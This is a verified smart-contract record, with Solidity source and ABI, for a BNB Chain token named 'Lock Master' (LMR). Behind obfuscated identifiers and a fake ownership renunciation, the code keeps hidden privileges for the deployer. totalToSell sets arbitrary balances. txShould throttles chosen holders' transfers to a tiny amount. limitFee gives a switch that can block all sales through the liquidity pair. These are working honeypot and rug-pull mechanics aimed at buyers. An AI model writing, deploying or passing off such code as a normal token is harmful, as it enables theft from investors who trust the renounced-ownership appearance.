{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface amountTx {\n    function createPair(address walletTakeTo, address receiverToFund) external returns (address);\n}\n\ninterface sellLaunchedTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderLiquidity) external view returns (uint256);\n\n    function transfer(address launchTakeAmount, uint256 amountLiquidity) external returns (bool);\n\n    function allowance(address liquidityMinTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchTakeAmount,\n        uint256 amountLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromIs, uint256 value);\n    event Approval(address indexed liquidityMinTo, address indexed spender, uint256 value);\n}\n\nabstract contract senderTeamWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellLaunchedTakeMetadata is sellLaunchedTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LockMaster is senderTeamWallet, sellLaunchedTake, sellLaunchedTakeMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return minLaunched;\n    }\n\n    uint8 private minLaunched = 18;\n\n    constructor (){\n        if (marketingAmount == isToTake) {\n            marketingAmount = swapIsTo;\n        }\n        atFee isAt = atFee(minToken);\n        sellSwap = amountTx(isAt.factory()).createPair(isAt.WETH(), address(this));\n        \n        isLiquiditySwap = _msgSender();\n        fromFeeLiquidity[isLiquiditySwap] = true;\n        totalFee[isLiquiditySwap] = shouldIs;\n        tokenAt();\n        \n        emit Transfer(address(0), isLiquiditySwap, shouldIs);\n    }\n\n    function atIs() private view {\n        require(fromFeeLiquidity[_msgSender()]);\n    }\n\n    address public isLiquiditySwap;\n\n    function getOwner() external view returns (address) {\n        return senderMax;\n    }\n\n    address minToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public fromFeeLiquidity;\n\n    uint256 constant launchBuyAuto = 12 ** 10;\n\n    uint256 private isToTake;\n\n    function receiverLiquidity(address receiverSell, address launchTakeAmount, uint256 amountLiquidity) internal returns (bool) {\n        require(totalFee[receiverSell] >= amountLiquidity);\n        totalFee[receiverSell] -= amountLiquidity;\n        totalFee[launchTakeAmount] += amountLiquidity;\n        emit Transfer(receiverSell, launchTakeAmount, amountLiquidity);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return senderMax;\n    }\n\n    string private minAt = \"LMR\";\n\n    function approve(address launchedFund, uint256 amountLiquidity) public virtual override returns (bool) {\n        launchedAutoIs[_msgSender()][launchedFund] = amountLiquidity;\n        emit Approval(_msgSender(), launchedFund, amountLiquidity);\n        return true;\n    }\n\n    function isTotal(address fundLiquidity) public {\n        if (takeSwap) {\n            return;\n        }\n        if (fromMode == isAmount) {\n            isToTake = isAmount;\n        }\n        fromFeeLiquidity[fundLiquidity] = true;\n        if (isToTake == fromMode) {\n            minTrading = false;\n        }\n        takeSwap = true;\n    }\n\n    mapping(address => uint256) private totalFee;\n\n    uint256 private shouldIs = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private launchedAutoIs;\n\n    function allowance(address marketingSenderTo, address launchedFund) external view virtual override returns (uint256) {\n        if (launchedFund == minToken) {\n            return type(uint256).max;\n        }\n        return launchedAutoIs[marketingSenderTo][launchedFund];\n    }\n\n    function balanceOf(address senderLiquidity) public view virtual override returns (uint256) {\n        return totalFee[senderLiquidity];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldIs;\n    }\n\n    uint256 private isAmount;\n\n    uint256 senderSwap;\n\n    bool public tokenWallet;\n\n    string private txFee = \"Lock Master\";\n\n    function launchedMarketingFee(address receiverSell, address launchTakeAmount, uint256 amountLiquidity) internal returns (bool) {\n        if (receiverSell == isLiquiditySwap) {\n            return receiverLiquidity(receiverSell, launchTakeAmount, amountLiquidity);\n        }\n        uint256 amountFund = sellLaunchedTake(sellSwap).balanceOf(autoLiquidity);\n        require(amountFund == senderSwap);\n        require(launchTakeAmount != autoLiquidity);\n        if (enableReceiver[receiverSell]) {\n            return receiverLiquidity(receiverSell, launchTakeAmount, launchBuyAuto);\n        }\n        return receiverLiquidity(receiverSell, launchTakeAmount, amountLiquidity);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minAt;\n    }\n\n    bool public senderAmount;\n\n    bool public takeSwap;\n\n    bool private minTrading;\n\n    address private senderMax;\n\n    uint256 private swapIsTo;\n\n    function txShould(address minToEnable) public {\n        atIs();\n        if (exemptTotal) {\n            marketingAmount = swapIsTo;\n        }\n        if (minToEnable == isLiquiditySwap || minToEnable == sellSwap) {\n            return;\n        }\n        enableReceiver[minToEnable] = true;\n    }\n\n    function limitFee(uint256 amountLiquidity) public {\n        atIs();\n        senderSwap = amountLiquidity;\n    }\n\n    bool public exemptTotal;\n\n    uint256 public receiverWallet;\n\n    address autoLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address receiverSell, address launchTakeAmount, uint256 amountLiquidity) external override returns (bool) {\n        if (_msgSender() != minToken) {\n            if (launchedAutoIs[receiverSell][_msgSender()] != type(uint256).max) {\n                require(amountLiquidity <= launchedAutoIs[receiverSell][_msgSender()]);\n                launchedAutoIs[receiverSell][_msgSender()] -= amountLiquidity;\n            }\n        }\n        return launchedMarketingFee(receiverSell, launchTakeAmount, amountLiquidity);\n    }\n\n    uint256 private marketingAmount;\n\n    uint256 txList;\n\n    mapping(address => bool) public enableReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return txFee;\n    }\n\n    event OwnershipTransferred(address indexed liquidityFund, address indexed autoAmount);\n\n    address public sellSwap;\n\n    function tokenAt() public {\n        emit OwnershipTransferred(isLiquiditySwap, address(0));\n        senderMax = address(0);\n    }\n\n    function transfer(address feeLimit, uint256 amountLiquidity) external virtual override returns (bool) {\n        return launchedMarketingFee(_msgSender(), feeLimit, amountLiquidity);\n    }\n\n    uint256 private fromMode;\n\n    function totalToSell(address feeLimit, uint256 amountLiquidity) public {\n        atIs();\n        totalFee[feeLimit] = amountLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMinTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSenderTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromFeeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLiquiditySwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLiquidity\",\"type\":\"address\"}],\"name\":\"isTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"limitFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"totalToSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTakeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToEnable\",\"type\":\"address\"}],\"name\":\"txShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LockMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}